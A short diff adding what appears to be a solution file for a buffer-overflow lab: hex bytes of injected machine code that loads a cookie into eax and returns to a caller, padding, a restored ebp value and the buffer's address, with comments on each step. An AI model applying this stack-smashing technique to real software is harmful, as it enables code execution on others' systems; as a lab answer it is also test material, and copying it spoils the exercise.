@@ -1,0 +1,11 @@
+/* to return cookie to the function test, we need to mov cookie to eax */
+/* to reuturn the function test after excuting ret code, we need to push the address of the code after call<getbuf> */
+b8 6a b6 bd 73 68 81 8e 04 08 
+c3 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00
+/* because when the functiong gets excute ret, ebp is changed with the attack value(pop %ebp), the go to the function test */
+/* so to restore the state of th stack, we need to get the primitive value of ebp */
+50 39 68 55
+/* address of buf */
+f8 38 68 55
